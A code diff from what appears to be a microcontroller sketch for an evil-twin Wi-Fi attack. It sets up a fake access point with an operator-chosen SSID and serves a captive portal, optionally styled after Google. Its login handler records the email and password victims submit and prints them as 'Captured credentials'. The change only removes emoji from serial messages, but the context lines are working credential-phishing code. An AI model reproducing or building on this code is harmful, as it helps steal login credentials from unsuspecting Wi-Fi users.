@@ -185,7 +185,7 @@ void handleLogin() {
   String email = server.hasArg("email") ? server.arg("email") : "";
   String password = server.hasArg("password") ? server.arg("password") : "";
 
-  Serial.println("🟢 Captured credentials:");
+  Serial.println("Captured credentials:");
   if (email != "") Serial.println("Email: " + email);
   Serial.println("Password: " + password);
 
@@ -200,7 +200,7 @@ void runPortal(bool isGoogle) {
   WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
   WiFi.softAP(inputSSID.c_str(), inputPASS.c_str());
 
-  Serial.println("✅ Fake AP running");
+  Serial.println("AP running");
   Serial.println("SSID: " + inputSSID);
   Serial.println("PASS: " + (inputPASS == "" ? "(open)" : inputPASS));
 
@@ -216,12 +216,12 @@ void runPortal(bool isGoogle) {
 
   server.on("/login", HTTP_POST, handleLogin);
   server.begin();
-  Serial.println("🌐 Captive portal ready");
+  Serial.println("Captive portal ready");
 }
 
 // ========== SERIAL INPUT ==========
 void waitForSerialInput() {
-  Serial.println("📶 Enter SSID:");
+  Serial.println("Enter SSID:");
   while (inputSSID == "") {
     if (Serial.available()) {
       inputSSID = Serial.readStringUntil('\n');
@@ -229,7 +229,7 @@ void waitForSerialInput() {
     }
   }
 
-  Serial.println("🔐 Enter Password (can be empty):");
+  Serial.println("Enter Password (can be empty):");
   while (inputPASS == "") {
     if (Serial.available()) {
       inputPASS = Serial.readStringUntil('\n');
@@ -238,7 +238,7 @@ void waitForSerialInput() {
     }
   }
 
-  Serial.println("🎯 Enter Portal type (super google / super pass):");
+  Serial.println("Enter Portal type (super google / super pass):");
   while (inputPortal == "") {
     if (Serial.available()) {
       inputPortal = Serial.readStringUntil('\n');
@@ -248,7 +248,7 @@ void waitForSerialInput() {
       } else if (inputPortal.equalsIgnoreCase("super pass")) {
         runPortal(false);
       } else {
-        Serial.println("❌ Invalid portal type, try again:");
+        Serial.println("Invalid portal type, try again:");
         inputPortal = "";
       }
     }
